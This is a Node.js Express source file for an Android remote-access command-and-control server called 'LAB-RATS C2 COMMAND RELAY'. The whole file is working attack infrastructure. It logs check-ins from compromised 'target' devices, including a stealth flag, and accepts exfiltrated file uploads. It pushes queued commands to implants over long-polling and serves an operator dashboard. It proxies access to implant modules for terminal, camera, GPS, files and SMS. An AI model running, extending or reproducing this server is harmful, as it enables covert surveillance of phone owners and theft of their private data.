const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/c2', express.static(path.join(__dirname, 'c2')));

const devices = new Map();
const commandQueues = new Map();
const pendingResponses = new Map();
const longPollWaiters = new Map(); // deviceId -> Array of res objects

const DATA_FILE = path.join(__dirname, 'devices.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            const json = JSON.parse(raw);
            if (json.devices && Array.isArray(json.devices)) {
                json.devices.forEach(d => {
                    if (d && (d.deviceId || d.model || d.brand)) {
                        const id = d.deviceId || d.brand || d.model;
                        devices.set(id, d);
                    }
                });
            }
        }
    } catch (e) {}
}

function saveData() {
    try {
        const data = {
            devices: Array.from(devices.values())
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch (e) {}
}

loadData();

function formatTime(isoString) {
    try {
        return new Date(isoString || Date.now()).toLocaleString('en-US', {
            timeZone: 'America/Toronto', hour12: true
        });
    } catch (e) {
        return new Date(isoString || Date.now()).toLocaleString();
    }
}

let lastActiveDeviceId = null;

function getCookie(cookieHeader, name) {
    if (!cookieHeader) return null;
    const matches = cookieHeader.match(new RegExp('(?:^|; )' + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)'));
    return matches ? decodeURIComponent(matches[1]) : null;
}

function dispatchCommand(deviceId, cmd) {
    let waiters = longPollWaiters.get(deviceId) || [];
    while (waiters.length > 0) {
        let res = waiters.shift();
        if (!res.headersSent) {
            res.json(cmd);
            return true;
        }
    }
    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
    commandQueues.get(deviceId).push(cmd);
    return false;
}

// Ingestion Handler for device check-ins
function handleCheckin(req, res) {
    try {
        const payload = req.body || {};
        const query = req.query || {};
        const data = { ...query, ...payload };

        const brand = data.brand || data.manufacturer || 'Android';
        const model = data.model || data.device || 'Device';
        const deviceId = data.deviceId || data.model || data.device || brand || 'Android Target';

        const entry = {
            deviceId,
            brand,
            model,
            os: data.os || 'Android 16',
            battery: data.battery || '100%',
            ip: data.ip || req.ip || '127.0.0.1',
            port: data.port || 9191,
            stealth: !!data.stealth,
            lastSeen: new Date().toISOString(),
            ...data
        };

        devices.set(deviceId, entry);
        saveData();

        console.log(`[CHECKIN SUCCESS] DeviceId: ${deviceId} | Brand: ${brand} | Model: ${model} | IP: ${entry.ip}`);
        res.json({ success: true, message: 'Check-in recorded' });
    } catch (err) {
        res.status(400).json({ success: false, error: err.message });
    }
}

// Check-in & Exfiltration Routes
app.all('/checkin', handleCheckin);
app.all('/checkin/', handleCheckin);
app.all('/api/checkin', handleCheckin);
app.all('/api/checkin/', handleCheckin);
app.post('/checkin', handleCheckin);

app.post('/upload', (req, res) => {
    console.log('[UPLOAD SUCCESS] Received exfiltrated payload from device:', req.headers['x-device-id'] || 'Unknown');
    res.json({ success: true, message: 'File payload ingested successfully' });
});

// Device command polling with Instant Long-Polling
function handleTunnelPoll(req, res) {
    const id = req.query.deviceId;
    if (!id) return res.json({});

    const queue = commandQueues.get(id) || [];
    if (queue.length > 0) {
        return res.json(queue.shift());
    }

    // Long-Polling: Hold connection open up to 10s for instant 0ms dispatch
    let polls = longPollWaiters.get(id) || [];
    polls.push(res);
    longPollWaiters.set(id, polls);

    req.on('close', () => {
        let list = longPollWaiters.get(id) || [];
        longPollWaiters.set(id, list.filter(r => r !== res));
    });

    setTimeout(() => {
        let list = longPollWaiters.get(id) || [];
        if (list.includes(res)) {
            longPollWaiters.set(id, list.filter(r => r !== res));
            if (!res.headersSent) res.json({});
        }
    }, 10000);
}
app.get('/tunnel-poll', handleTunnelPoll);
app.get('/checkin/tunnel-poll', handleTunnelPoll);

// Device command response
function handleTunnelResponse(req, res) {
    const data = req.body || {};
    const pending = pendingResponses.get(data.id);
    if (pending) {
        pendingResponses.delete(data.id);
        const buf = Buffer.from(data.payload || '', 'base64');
        pending.res.status(data.status || 200);
        if (data.contentType) pending.res.setHeader('Content-Type', data.contentType);
        pending.res.send(buf);
    }
    res.json({ success: true });
}
app.post('/tunnel-response', handleTunnelResponse);
app.post('/checkin/tunnel-response', handleTunnelResponse);

// GET / serves Operator Dashboard HTML or handles GET check-ins
app.get('/', (req, res) => {
    if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
        return handleCheckin(req, res);
    }

    const deviceList = Array.from(devices.values());

    let devicesHtml = deviceList.length === 0 ?
        '<tr><td colspan="8" style="text-align: center; color: #888; padding: 30px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
        deviceList.map(d => `
            <tr>
                <td style="font-family: monospace; color: var(--neon-cyan);">${d.brand || d.deviceId || 'samsung'}</td>
                <td>${d.model || 'SM-F731W'}</td>
                <td>Android ${d.os || '16'}</td>
                <td>${d.battery || '100%'}</td>
                <td style="font-family: monospace; color: var(--neon-green);">${d.ip || 'N/A'}:${d.port || '9191'}</td>
                <td>${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
                <td style="font-size: 0.75rem; color: #aaa;">${formatTime(d.lastSeen)}</td>
                <td><a href="/proxy/?deviceId=${d.deviceId || d.brand || 'samsung'}" target="_blank" style="background: var(--neon-cyan); color: #000; padding: 6px 14px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.7rem;">CONNECT</a></td>
            </tr>
        `).join('');

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAB-RATS | C2 COMMAND RELAY</title>
    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/c2/style.css">
    <style>
        th { padding: 14px 20px !important; color: var(--neon-cyan) !important; font-family: 'Orbitron', sans-serif !important; font-size: 0.7rem !important; letter-spacing: 2px !important; text-transform: uppercase !important; white-space: nowrap !important; }
        td { padding: 14px 20px !important; white-space: nowrap !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header" style="text-align:center; padding:20px 0; margin-bottom:20px;">
            <img src="/c2/header_dashboard.png" style="width: 90%; max-width: 900px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
        </div>

        <div class="card" style="margin-top: 20px;">
            <h2>CONNECTED_TARGETS_REGISTRY</h2>
            <div style="overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>DEVICE ID</th>
                            <th>MODEL</th>
                            <th>OS VERSION</th>
                            <th>BATTERY</th>
                            <th>ENDPOINT IP</th>
                            <th>PROFILE</th>
                            <th>LAST CHECK-IN</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${devicesHtml}
                    </tbody>
                </table>
            </div>
            <div style="text-align: right; margin-top: 15px;">
                <button class="btn" onclick="location.reload()" style="padding: 10px 25px; font-size: 0.75rem;">REFRESH_REGISTRY</button>
            </div>
        </div>
    </div>
</body>
</html>`;

    res.send(html);
});

// Catch-All Device Proxy Handler (Proxies all module tabs: /terminal, /ghost, /camera, /gps, /files, /sms, etc.)
app.all('*', (req, res) => {
    if (req.path === '/favicon.ico') return res.status(404).end();

    let deviceId = req.query.deviceId || getCookie(req.headers.cookie, 'c2_target_device') || lastActiveDeviceId;

    // Fallback: Pick the most recently active checked-in device
    if (!deviceId && devices.size > 0) {
        let latestDevice = null;
        let latestTime = 0;
        for (const [id, dev] of devices.entries()) {
            const t = new Date(dev.lastSeen || 0).getTime();
            if (t > latestTime) {
                latestTime = t;
                latestDevice = id;
            }
        }
        deviceId = latestDevice || Array.from(devices.keys())[0];
    }

    if (!deviceId) deviceId = 'samsung';

    if (deviceId) {
        lastActiveDeviceId = deviceId;
        res.setHeader('Set-Cookie', `c2_target_device=${encodeURIComponent(deviceId)}; Path=/; SameSite=Lax`);
    }

    if (!devices.has(deviceId)) {
        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
        saveData();
    }

    const requestId = Math.random().toString(36).substring(7);
    let relayPath = req.originalUrl.replace('/proxy', '') || '/';
    if (!relayPath.startsWith('/')) relayPath = '/' + relayPath;

    pendingResponses.set(requestId, { res });

    const cmdObj = {
        type: 'request',
        id: requestId,
        method: req.method,
        path: relayPath,
        body: req.method === 'POST' ? (typeof req.body === 'object' ? JSON.stringify(req.body) : req.body) : ''
    };

    dispatchCommand(deviceId, cmdObj);

    setTimeout(() => {
        if (pendingResponses.has(requestId)) {
            pendingResponses.delete(requestId);
            if (!res.headersSent) res.status(504).send('<!DOCTYPE html><html><body style="background:#02080d;color:#ff3131;font-family:monospace;padding:40px;text-align:center;"><h2>TUNNEL_GATEWAY_TIMEOUT</h2><p>Device is offline or not polling.</p></body></html>');
        }
    }, 25000);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
});
